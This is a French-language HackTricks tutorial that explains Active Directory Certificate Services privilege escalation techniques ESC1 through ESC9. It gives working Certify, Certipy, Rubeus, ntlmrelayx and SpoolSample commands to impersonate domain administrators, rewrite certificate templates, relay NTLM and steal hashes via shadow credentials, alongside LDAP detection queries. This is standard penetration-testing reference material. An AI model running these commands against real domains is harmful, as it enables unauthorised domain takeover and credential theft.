# Élévation de privilèges de domaine AD CS

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert Red Team AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>

**Il s'agit d'un résumé des sections des techniques d'élévation de privilèges des articles :**
* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Modèles de certificats mal configurés - ESC1

### Explication

### Modèles de certificats mal configurés - ESC1 Expliqué

* **Les droits d'inscription sont accordés aux utilisateurs à faible privilège par l'entreprise CA.**
* **L'approbation du gestionnaire n'est pas requise.**
* **Aucune signature de personnel autorisé n'est nécessaire.**
* **Les descripteurs de sécurité sur les modèles de certificats sont excessivement permissifs, permettant aux utilisateurs à faible privilège d'obtenir des droits d'inscription.**
* **Les modèles de certificats sont configurés pour définir des EKU qui facilitent l'authentification :**
* Les identifiants d'utilisation étendue de clé (EKU) tels que l'authentification client (OID 1.3.6.1.5.5.7.3.2), l'authentification client PKINIT (1.3.6.1.5.2.3.4), la connexion de carte à puce (OID 1.3.6.1.4.1.311.20.2.2), tout usage (OID 2.5.29.37.0), ou aucun EKU (SubCA) sont inclus.
* **La capacité pour les demandeurs d'inclure un subjectAltName dans la demande de signature de certificat (CSR) est autorisée par le modèle :**
* L'Active Directory (AD) donne la priorité au subjectAltName (SAN) dans un certificat pour la vérification d'identité s'il est présent. Cela signifie qu'en spécifiant le SAN dans une CSR, un certificat peut être demandé pour se faire passer pour n'importe quel utilisateur (par exemple, un administrateur de domaine). La possibilité de spécifier un SAN par le demandeur est indiquée dans l'objet AD du modèle de certificat via la propriété `mspki-certificate-name-flag`. Cette propriété est un masque de bits, et la présence du drapeau `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` permet au demandeur de spécifier le SAN.

{% hint style="danger" %}
La configuration décrite permet aux utilisateurs à faible privilège de demander des certificats avec n'importe quel SAN de leur choix, permettant l'authentification en tant que n'importe quel principal de domaine via Kerberos ou SChannel.
{% endhint %}

Cette fonctionnalité est parfois activée pour prendre en charge la génération à la volée de certificats HTTPS ou d'hôte par des produits ou des services de déploiement, ou en raison d'un manque de compréhension.

Il est noté que la création d'un certificat avec cette option déclenche un avertissement, ce qui n'est pas le cas lorsqu'un modèle de certificat existant (tel que le modèle `WebServer`, qui a `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` activé) est dupliqué puis modifié pour inclure un OID d'authentification.

### Abus

Pour **trouver des modèles de certificats vulnérables**, vous pouvez exécuter :
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Pour **exploiter cette vulnérabilité pour se faire passer pour un administrateur**, on pourrait exécuter :
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Ensuite, vous pouvez transformer le **certificat généré au format `.pfx`** et l'utiliser pour **vous authentifier à l'aide de Rubeus ou certipy** à nouveau:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Les binaires Windows "Certreq.exe" & "Certutil.exe" peuvent être utilisés pour générer le PFX : https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

L'énumération des modèles de certificat dans le schéma de configuration de la forêt AD, en particulier ceux ne nécessitant pas d'approbation ou de signatures, possédant une EKU d'authentification client ou de connexion de carte à puce, et avec le drapeau `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` activé, peut être effectuée en exécutant la requête LDAP suivante :
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Modèles de certificat mal configurés - ESC2

### Explication

Le deuxième scénario d'abus est une variation du premier :

1. Les droits d'inscription sont accordés aux utilisateurs à faibles privilèges par l'entreprise CA.
2. L'exigence d'approbation du gestionnaire est désactivée.
3. Le besoin de signatures autorisées est omis.
4. Un descripteur de sécurité excessivement permissif sur le modèle de certificat accorde des droits d'inscription aux certificats aux utilisateurs à faibles privilèges.
5. **Le modèle de certificat est défini pour inclure l'EKU Tout Usage ou aucun EKU.**

L'**EKU Tout Usage** permet à un certificat d'être obtenu par un attaquant pour **n'importe quel usage**, y compris l'authentification client, l'authentification serveur, la signature de code, etc. La même **technique utilisée pour ESC3** peut être utilisée pour exploiter ce scénario.

Les certificats **sans EKU**, qui agissent comme certificats de CA subordonnés, peuvent être exploités pour **n'importe quel usage** et peuvent **également être utilisés pour signer de nouveaux certificats**. Ainsi, un attaquant pourrait spécifier des EKU ou des champs arbitraires dans les nouveaux certificats en utilisant un certificat de CA subordonné.

Cependant, les nouveaux certificats créés pour **l'authentification de domaine** ne fonctionneront pas si la CA subordonnée n'est pas approuvée par l'objet **`NTAuthCertificates`**, qui est le paramètre par défaut. Néanmoins, un attaquant peut toujours créer de **nouveaux certificats avec n'importe quel EKU** et des valeurs de certificat arbitraires. Ceux-ci pourraient être potentiellement **abusés** pour une large gamme d'usages (par exemple, la signature de code, l'authentification serveur, etc.) et pourraient avoir des implications significatives pour d'autres applications dans le réseau comme SAML, AD FS, ou IPSec.

Pour énumérer les modèles correspondant à ce scénario dans le schéma de configuration de la forêt AD, la requête LDAP suivante peut être exécutée :
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Modèles d'Agent d'Inscription Mal Configurés - ESC3

### Explication

Ce scénario est similaire aux deux premiers mais **exploite** un **EKU différent** (Agent de Demande de Certificat) et **2 modèles différents** (donc il a 2 ensembles de conditions),

L'**EKU de l'Agent de Demande de Certificat** (OID 1.3.6.1.4.1.311.20.2.1), connu sous le nom d'**Agent d'Inscription** dans la documentation Microsoft, permet à un principal de **s'inscrire** pour un **certificat** au **nom d'un autre utilisateur**.

L'**"agent d'inscription"** s'inscrit dans un tel **modèle** et utilise le **certificat résultant pour co-signer une CSR au nom de l'autre utilisateur**. Il **envoie** ensuite la **CSR co-signée** au CA, s'inscrivant dans un **modèle** qui **autorise "l'inscription au nom de"**, et le CA répond avec un **certificat appartenant à l'utilisateur "autre"**.

**Conditions 1:**

- Les droits d'inscription sont accordés aux utilisateurs à faibles privilèges par le CA d'entreprise.
- L'exigence d'approbation du gestionnaire est omise.
- Aucune exigence de signatures autorisées.
- Le descripteur de sécurité du modèle de certificat est excessivement permissif, accordant des droits d'inscription aux utilisateurs à faibles privilèges.
- Le modèle de certificat inclut l'EKU de l'Agent de Demande de Certificat, permettant la demande d'autres modèles de certificat au nom d'autres principaux.

**Conditions 2:**

- Le CA d'entreprise accorde des droits d'inscription aux utilisateurs à faibles privilèges.
- L'approbation du gestionnaire est contournée.
- La version du schéma du modèle est soit 1 ou dépasse 2, et spécifie une Exigence d'Émission de Politique d'Application qui nécessite l'EKU de l'Agent de Demande de Certificat.
- Un EKU défini dans le modèle de certificat permet l'authentification de domaine.
- Aucune restriction pour les agents d'inscription n'est appliquée sur le CA.

### Abus

Vous pouvez utiliser [**Certify**](https://github.com/GhostPack/Certify) ou [**Certipy**](https://github.com/ly4k/Certipy) pour abuser de ce scénario:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Les **utilisateurs** autorisés à **obtenir** un **certificat d'agent d'inscription**, les modèles dans lesquels les **agents** d'inscription sont autorisés à s'inscrire, et les **comptes** pour lesquels l'agent d'inscription peut agir peuvent être restreints par les AC d'entreprise. Cela est réalisé en ouvrant le `certsrc.msc` **snap-in**, en **cliquant avec le bouton droit sur le CA**, en **cliquant sur Propriétés**, puis en **naviguant** vers l'onglet "Agents d'inscription".

Cependant, il est noté que le paramètre **par défaut** pour les AC est "Ne pas restreindre les agents d'inscription". Lorsque la restriction sur les agents d'inscription est activée par les administrateurs, en la définissant sur "Restreindre les agents d'inscription", la configuration par défaut reste extrêmement permissive. Cela permet à **Tout le monde** d'accéder à tous les modèles pour s'inscrire en tant que n'importe qui.

## Contrôle d'accès vulnérable aux modèles de certificats - ESC4

### **Explication**

Le **descripteur de sécurité** sur les **modèles de certificats** définit les **autorisations** spécifiques que les **principaux AD** possèdent concernant le modèle.

Si un **attaquant** possède les **autorisations** requises pour **modifier** un **modèle** et **mettre en place** des **erreurs de configuration exploitables** décrites dans les **sections précédentes**, une élévation de privilèges pourrait être facilitée.

Les autorisations notables applicables aux modèles de certificats comprennent :

- **Propriétaire :** Accorde un contrôle implicite sur l'objet, permettant la modification de tous les attributs.
- **Contrôle total :** Permet une autorité complète sur l'objet, y compris la capacité de modifier tous les attributs.
- **Écrire le propriétaire :** Autorise la modification du propriétaire de l'objet à un principal sous le contrôle de l'attaquant.
- **Écrire le DACL :** Permet l'ajustement des contrôles d'accès, accordant potentiellement à un attaquant un Contrôle total.
- **Écrire la propriété :** Autorise la modification de toutes les propriétés de l'objet.

### Abus

Un exemple de privesc comme le précédent :

<figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>

ESC4 est lorsque qu'un utilisateur a des privilèges d'écriture sur un modèle de certificat. Cela peut par exemple être exploité pour écraser la configuration du modèle de certificat afin de le rendre vulnérable à ESC1.

Comme nous pouvons le voir dans le chemin ci-dessus, seul `JOHNPC` a ces privilèges, mais notre utilisateur `JOHN` a le nouvel avantage `AddKeyCredentialLink` vers `JOHNPC`. Puisque cette technique est liée aux certificats, j'ai également mis en œuvre cette attaque, connue sous le nom de [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Voici un petit aperçu de la commande `shadow auto` de Certipy pour récupérer le hachage NT de la victime.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** peut écraser la configuration d'un modèle de certificat avec une seule commande. Par **défaut**, Certipy va **écraser** la configuration pour la rendre **vulnérable à ESC1**. Nous pouvons également spécifier le paramètre **`-save-old` pour sauvegarder l'ancienne configuration**, ce qui sera utile pour **restaurer** la configuration après notre attaque.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Contrôle d'accès aux objets PKI vulnérables - ESC5

### Explication

Le vaste réseau de relations interconnectées basées sur les ACL, qui inclut plusieurs objets au-delà des modèles de certificats et de l'autorité de certification, peut impacter la sécurité de tout le système AD CS. Ces objets, qui peuvent affecter significativement la sécurité, englobent :

* L'objet ordinateur AD du serveur CA, qui peut être compromis par des mécanismes comme S4U2Self ou S4U2Proxy.
* Le serveur RPC/DCOM du serveur CA.
* Tout objet AD descendant ou conteneur dans le chemin de conteneur spécifique `CN=Services de clés publiques,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Ce chemin inclut, mais n'est pas limité à, des conteneurs et objets tels que le conteneur Modèles de certificats, le conteneur Autorités de certification, l'objet NTAuthCertificates et le conteneur Services d'inscription.

La sécurité du système PKI peut être compromise si un attaquant à faibles privilèges parvient à prendre le contrôle de l'un de ces composants critiques.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explication

Le sujet discuté dans le [**article de l'Académie CQure**](https://cqureacademy.com/blog/enhanced-key-usage) aborde également les implications du drapeau **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, telles que décrites par Microsoft. Cette configuration, lorsqu'elle est activée sur une Autorité de Certification (CA), permet l'inclusion de **valeurs définies par l'utilisateur** dans le **nom alternatif du sujet** pour **toute demande**, y compris celles construites à partir d'Active Directory®. Par conséquent, cette disposition permet à un **intrus** de s'inscrire via **n'importe quel modèle** configuré pour l'**authentification de domaine**—en particulier ceux ouverts à l'inscription d'utilisateurs **non privilégiés**, comme le modèle Utilisateur standard. En conséquence, un certificat peut être sécurisé, permettant à l'intrus de s'authentifier en tant qu'administrateur de domaine ou **toute autre entité active** dans le domaine.

**Remarque** : L'approche pour ajouter des **noms alternatifs** dans une demande de signature de certificat (CSR), via l'argument `-attrib "SAN:"` dans `certreq.exe` (appelés "Paires Nom-Valeur"), présente un **contraste** par rapport à la stratégie d'exploitation des SAN dans ESC1. Ici, la distinction réside dans **la manière dont les informations de compte sont encapsulées**—dans un attribut de certificat, plutôt que dans une extension.

### Abus

Pour vérifier si le paramètre est activé, les organisations peuvent utiliser la commande suivante avec `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Cette opération utilise essentiellement **l'accès au registre à distance**, par conséquent, une approche alternative pourrait être :
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Des outils comme [**Certify**](https://github.com/GhostPack/Certify) et [**Certipy**](https://github.com/ly4k/Certipy) sont capables de détecter cette mauvaise configuration et de l'exploiter :
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Pour modifier ces paramètres, en supposant que l'on possède des droits d'**administrateur de domaine** ou équivalents, la commande suivante peut être exécutée à partir de n'importe quelle station de travail :
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Pour désactiver cette configuration dans votre environnement, le drapeau peut être supprimé avec :
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
Après les mises à jour de sécurité de mai 2022, les **certificats** nouvellement émis contiendront une **extension de sécurité** qui intègre la **propriété `objectSid` du demandeur**. Pour ESC1, ce SID est dérivé du SAN spécifié. Cependant, pour **ESC6**, le SID reflète l'**`objectSid` du demandeur**, et non le SAN.\
Pour exploiter ESC6, il est essentiel que le système soit vulnérable à ESC10 (Mappings de certificats faibles), qui donne la priorité au **SAN sur la nouvelle extension de sécurité**.
{% endhint %}

## Contrôle d'accès vulnérable de l'autorité de certification - ESC7

### Attaque 1

#### Explication

Le contrôle d'accès pour une autorité de certification est maintenu à travers un ensemble d'autorisations qui régissent les actions de la CA. Ces autorisations peuvent être consultées en accédant à `certsrv.msc`, en cliquant avec le bouton droit sur une CA, en sélectionnant Propriétés, puis en naviguant jusqu'à l'onglet Sécurité. De plus, les autorisations peuvent être énumérées en utilisant le module PSPKI avec des commandes telles que :
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Cela fournit des informations sur les droits principaux, à savoir **`ManageCA`** et **`ManageCertificates`**, qui correspondent aux rôles d'« administrateur de CA » et de « gestionnaire de certificats » respectivement.

#### Abus

Avoir des droits **`ManageCA`** sur une autorité de certification permet au principal de manipuler les paramètres à distance en utilisant PSPKI. Cela inclut le basculement du drapeau **`EDITF_ATTRIBUTESUBJECTALTNAME2`** pour permettre la spécification SAN dans n'importe quel modèle, un aspect critique de l'escalade de domaine.

La simplification de ce processus est réalisable grâce à l'utilisation de la cmdlet **Enable-PolicyModuleFlag** de PSPKI, permettant des modifications sans interaction directe avec l'interface graphique.

La possession des droits **`ManageCertificates`** facilite l'approbation des demandes en attente, contournant efficacement la sauvegarde "approbation du gestionnaire de certificat de CA".

Une combinaison des modules **Certify** et **PSPKI** peut être utilisée pour demander, approuver et télécharger un certificat :
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attaque 2

#### Explication

{% hint style="warning" %}
Dans l'**attaque précédente**, les autorisations **`Gérer CA`** ont été utilisées pour **activer** le drapeau **EDITF\_ATTRIBUTESUBJECTALTNAME2** afin d'effectuer l'attaque **ESC6**, mais cela n'aura aucun effet tant que le service CA (`CertSvc`) n'est pas redémarré. Lorsqu'un utilisateur a le droit d'accès `Gérer CA`, l'utilisateur est également autorisé à **redémarrer le service**. Cependant, cela **ne signifie pas que l'utilisateur peut redémarrer le service à distance**. De plus, **ESC6** pourrait ne pas fonctionner immédiatement dans la plupart des environnements patchés en raison des mises à jour de sécurité de mai 2022.
{% endhint %}

Par conséquent, une autre attaque est présentée ici.

Prérequis :

- Seulement la permission **`GérerCA`**
- Permission **`Gérer Certificats`** (peut être accordée depuis **`GérerCA`**)
- Le modèle de certificat **`SubCA`** doit être **activé** (peut être activé depuis **`GérerCA`**)

La technique repose sur le fait que les utilisateurs ayant le droit d'accès `Gérer CA` _et_ `Gérer Certificats` peuvent **émettre des demandes de certificat en échec**. Le modèle de certificat **`SubCA`** est **vulnérable à ESC1**, mais **seuls les administrateurs** peuvent s'inscrire dans le modèle. Ainsi, un **utilisateur** peut **demander** à s'inscrire dans le **`SubCA`** - ce qui sera **refusé** - mais **ensuite émis par le gestionnaire par la suite**.

#### Abus

Vous pouvez **vous accorder vous-même la permission `Gérer Certificats`** en ajoutant votre utilisateur en tant que nouvel officier.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Le modèle **`SubCA`** peut être **activé sur le CA** avec le paramètre `-enable-template`. Par défaut, le modèle `SubCA` est activé.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Si nous avons rempli les prérequis pour cette attaque, nous pouvons commencer par **demander un certificat basé sur le modèle `SubCA`**.

**Cette demande sera refusée**, mais nous sauvegarderons la clé privée et noterons l'ID de la demande.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Avec notre **`Gérer CA` et `Gérer Certificats`**, nous pouvons ensuite **émettre la demande de certificat échouée** avec la commande `ca` et le paramètre `-issue-request <ID de demande>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Et enfin, nous pouvons **récupérer le certificat délivré** avec la commande `req` et le paramètre `-retrieve <ID de la demande>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay vers les points de terminaison HTTP AD CS - ESC8

### Explication

{% hint style="info" %}
Dans les environnements où **AD CS est installé**, s'il existe un **point de terminaison d'inscription web vulnérable** et qu'au moins un **modèle de certificat est publié** qui autorise **l'inscription des ordinateurs de domaine et l'authentification des clients** (comme le modèle par défaut **`Machine`**), il devient possible pour **n'importe quel ordinateur avec le service spouleur actif d'être compromis par un attaquant**!
{% endhint %}

Plusieurs **méthodes d'inscription basées sur HTTP** sont prises en charge par AD CS, rendues disponibles via des rôles serveur supplémentaires que les administrateurs peuvent installer. Ces interfaces pour l'inscription de certificats basée sur HTTP sont susceptibles aux **attaques de relais NTLM**. Un attaquant, à partir d'une **machine compromise, peut se faire passer pour n'importe quel compte AD qui s'authentifie via NTLM entrant**. En se faisant passer pour le compte de la victime, ces interfaces web peuvent être accessibles par un attaquant pour **demander un certificat d'authentification client en utilisant les modèles de certificat `User` ou `Machine`**.

* L'**interface d'inscription web** (une ancienne application ASP disponible à `http://<caserver>/certsrv/`), par défaut en HTTP uniquement, ce qui ne protège pas contre les attaques de relais NTLM. De plus, elle autorise explicitement uniquement l'authentification NTLM via son en-tête HTTP Authorization, rendant des méthodes d'authentification plus sécurisées comme Kerberos inapplicables.
* Le **Service d'inscription de certificats** (CES), le **Service Web de Politique d'Inscription de Certificats** (CEP) et le **Service d'Inscription des Appareils Réseau** (NDES) prennent en charge par défaut l'authentification de négociation via leur en-tête HTTP Authorization. L'authentification de négociation prend en charge à la fois Kerberos et **NTLM**, permettant à un attaquant de **revenir à l'authentification NTLM** lors d'attaques de relais. Bien que ces services web activent HTTPS par défaut, HTTPS seul **ne protège pas contre les attaques de relais NTLM**. La protection contre les attaques de relais NTLM pour les services HTTPS est uniquement possible lorsque HTTPS est combiné avec la liaison de canal. Malheureusement, AD CS n'active pas la Protection Étendue pour l'Authentification sur IIS, ce qui est nécessaire pour la liaison de canal.

Un **problème** courant avec les attaques de relais NTLM est la **courte durée des sessions NTLM** et l'incapacité de l'attaquant à interagir avec des services qui **requièrent la signature NTLM**.

Cependant, cette limitation est surmontée en exploitant une attaque de relais NTLM pour acquérir un certificat pour l'utilisateur, car la période de validité du certificat dicte la durée de la session, et le certificat peut être utilisé avec des services qui **exigent la signature NTLM**. Pour des instructions sur l'utilisation d'un certificat volé, consultez :

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

Une autre limitation des attaques de relais NTLM est que **une machine contrôlée par l'attaquant doit être authentifiée par un compte victime**. L'attaquant pourrait soit attendre, soit tenter de **forcer** cette authentification :

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **Abus**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` énumère les **points de terminaison AD CS HTTP activés** :
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

La propriété `msPKI-Enrollment-Servers` est utilisée par les autorités de certification d'entreprise (CAs) pour stocker les points de terminaison du service d'inscription de certificat (CES). Ces points de terminaison peuvent être analysés et répertoriés en utilisant l'outil **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (2) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (8) (2) (2).png" alt=""><figcaption></figcaption></figure>

#### Abus avec Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abus avec [Certipy](https://github.com/ly4k/Certipy)

La demande de certificat est effectuée par Certipy par défaut en fonction du modèle `Machine` ou `User`, déterminé par la fin du nom du compte relayé en `$`. La spécification d'un modèle alternatif peut être réalisée en utilisant le paramètre `-template`.

Une technique comme [PetitPotam](https://github.com/ly4k/PetitPotam) peut ensuite être utilisée pour forcer l'authentification. Lorsqu'il s'agit de contrôleurs de domaine, la spécification de `-template DomainController` est requise.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Aucune extension de sécurité - ESC9 <a href="#5485" id="5485"></a>

### Explication

La nouvelle valeur **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) pour **`msPKI-Enrollment-Flag`**, appelée ESC9, empêche l'intégration de la **nouvelle extension de sécurité `szOID_NTDS_CA_SECURITY_EXT`** dans un certificat. Ce drapeau devient pertinent lorsque `StrongCertificateBindingEnforcement` est défini sur `1` (paramètre par défaut), ce qui contraste avec un paramètre de `2`. Sa pertinence est accrue dans les scénarios où un mappage de certificat plus faible pour Kerberos ou Schannel pourrait être exploité (comme dans ESC10), étant donné que l'absence d'ESC9 ne modifierait pas les exigences.

Les conditions dans lesquelles le réglage de ce drapeau devient significatif incluent :
- `StrongCertificateBindingEnforcement` n'est pas ajusté sur `2` (le paramètre par défaut étant `1`), ou `CertificateMappingMethods` inclut le drapeau `UPN`.
- Le certificat est marqué avec le drapeau `CT_FLAG_NO_SECURITY_EXTENSION` dans le réglage `msPKI-Enrollment-Flag`.
- Une EKU d'authentification client est spécifiée par le certificat.
- Des autorisations `GenericWrite` sont disponibles sur n'importe quel compte pour compromettre un autre.

### Scénario d'abus

Supposons que `John@corp.local` détient des autorisations `GenericWrite` sur `Jane@corp.local`, dans le but de compromettre `Administrator@corp.local`. Le modèle de certificat `ESC9`, dans lequel `Jane@corp.local` est autorisée à s'inscrire, est configuré avec le drapeau `CT_FLAG_NO_SECURITY_EXTENSION` dans son réglage `msPKI-Enrollment-Flag`.

Initialement, le hachage de `Jane` est acquis en utilisant les informations d'identification Shadow, grâce à `GenericWrite` de `John` :
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Ensuite, le `userPrincipalName` de `Jane` est modifié en `Administrateur`, en omettant délibérément la partie de domaine `@corp.local` :
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Cette modification ne viole pas les contraintes, étant donné que `Administrator@corp.local` reste distinct en tant que `userPrincipalName` de `Administrator`.

Suite à cela, le modèle de certificat `ESC9`, marqué comme vulnérable, est demandé en tant que `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
